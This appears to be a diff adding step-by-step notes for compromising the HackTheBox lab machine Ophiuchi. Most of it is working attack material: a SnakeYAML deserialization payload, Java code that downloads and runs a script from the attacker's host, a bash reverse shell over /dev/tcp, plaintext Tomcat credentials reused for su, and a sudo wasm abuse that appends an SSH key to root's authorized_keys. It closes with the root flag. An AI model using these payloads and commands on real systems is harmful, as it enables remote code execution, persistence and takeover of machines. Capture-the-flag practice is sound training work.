@@ -1,0 +1,196 @@
+let's enumerate first
+command: sudo rustscan -a 10.10.10.227
+result:
+PORT     STATE SERVICE    REASON
+8080/tcp open  http-proxy syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 8080 10.10.10.227
+result:
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache Tomcat 9.0.38
+|_http-title: Parse YAML
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+
+command: gobuster dir -u http://10.10.10.227:8080 -w /snap/seclists/34/Discovery/Web-Content/directory-list-2.3-small.txt
+result:
+===============================================================
+2023/06/25 23:14:38 Starting gobuster in directory enumeration mode
+===============================================================
+/test                 (Status: 302) [Size: 0] [--> /test/]
+/manager              (Status: 302) [Size: 0] [--> /manager/]
+
+access: http://10.10.10.227:8080/
+
+java deserialization poc 
+command: sudo python3 -m http.server 80
+
+payload input:
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://10.10.16.19/"]
+  ]]
+]
+
+result:
+10.10.10.227 - - [25/Jun/2023 23:17:10] code 404, message File not found
+10.10.10.227 - - [25/Jun/2023 23:17:10] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 404 -
+
+let's clone this repo https://github.com/artsploit/yaml-payload
+change code to this:
+public AwesomeScriptEngineFactory() throws InterruptedException{
+    try {
+        Runtime.getRuntime().exec("ping -c 1 10.10.16.19");
+    } catch (IOException e) {
+        e.printStackTrace();
+    }
+}
+
+command: javac --release 8 src/artsploit/AwesomeScriptEngineFactory.java
+command: jar -cvf ping.jar -C src/ .
+
+command: sudo tcpdump -i tun0 -n icmp
+comamnd: sudo python3 -m http.server 80
+
+input this payload: 
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://10.10.16.19/ping.jar"]
+  ]]
+]
+
+command: jar -tf ping.jar           
+META-INF/
+META-INF/MANIFEST.MF
+META-INF/services/
+META-INF/services/javax.script.ScriptEngineFactory
+artsploit/
+artsploit/AwesomeScriptEngineFactory.class
+artsploit/AwesomeScriptEngineFactory.java
+artsploit/javax.script.ScriptEngineFactory
+
+repeat and change to this java code:
+public AwesomeScriptEngineFactory() throws InterruptedException{
+    try {
+        // Runtime.getRuntime().exec("ping -c 1 10.10.16.19");
+        Process p = Runtime.getRuntime().exec("curl http://10.10.16.19/shell.sh -o /dev/shm/.s.sh");
+        p.waitFor();
+        p = Runtime.getRuntime().exec("chmod +x /dev/shm/.s.sh");
+        p.waitFor();
+        p = Runtime.getRuntime().exec("/dev/shm/.s.sh");
+    } catch (IOException e) {
+        e.printStackTrace();
+    }
+}
+
+create shell.sh:
+#!/bin/bash
+
+bash >& /dev/tcp/10.10.16.19/4444 0>&1
+
+command: sudo python3 -m http.server 80
+put this payload:
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://10.10.16.19/ping.jar"]
+  ]]
+]
+
+upgrade shell using python
+
+command: cd /opt/tomcat/conf
+command: cat tomcat-users.xml
+take attention:
+<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
+
+command: su - admin
+password: whythereisalimit
+
+command: sudo -l
+result:
+User admin may run the following commands on ophiuchi:
+    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
+
+command: cat /opt/wasm-functions/index.go
+result:
+package main
+
+import (
+	"fmt"
+	wasm "github.com/wasmerio/wasmer-go/wasmer"
+	"os/exec"
+	"log"
+)
+
+
+func main() {
+	bytes, _ := wasm.ReadBytes("main.wasm")
+
+	instance, _ := wasm.NewInstance(bytes)
+	defer instance.Close()
+	init := instance.Exports["info"]
+	result,_ := init()
+	f := result.String()
+	if (f != "1") {
+		fmt.Println("Not ready to deploy")
+	} else {
+		fmt.Println("Ready to deploy")
+		out, err := exec.Command("/bin/sh", "deploy.sh").Output()
+		if err != nil {
+			log.Fatal(err)
+		}
+		fmt.Println(string(out))
+	}
+}
+
+let's download main.wasm from /opt/wasm-functions
+let's decompile
+command: /home/donika-pentest/Downloads/wabt/build/wasm-decompile main.wasm
+result:
+export memory memory(initial: 16, max: 0);
+
+global g_a:int = 1048576;
+export global data_end:int = 1048576;
+export global heap_base:int = 1048576;
+
+table T_a:funcref(min: 1, max: 1);
+
+export function info():int {
+  return 0
+}
+
+access: https://wasdk.github.io/WasmFiddle/
+change code to this:
+int info() { 
+  return 1;
+}
+
+then build download wasm
+change program.wasm to main.wasm
+
+create file deploy.sh, code below:
+#!/bin/bash
+
+echo "[*] Adding public key to /root/.ssh/authorized_keys"
+mkdir -p /root/.ssh
+echo "you id_rsa_public_key" >> /root/.ssh/authorized_keys
+echo "[+] Done."
+
+let's upload to /tmp
+
+command: sudo /usr/bin/go run /opt/wasm-functions/index.go
+Ready to deploy
+[*] Adding public key to /root/.ssh/authorized_keys
+[+] Done.
+
+
+command: ssh root@10.10.10.227
+command: cat /root/root.txt
+bd623f3f81991ed5852e4c2ca7c9d975
+
+resource:
+https://0xdf.gitlab.io/2021/07/03/htb-ophiuchi.html
+
+https://arz101.medium.com/hackthebox-ophiuchi-34c035abb581
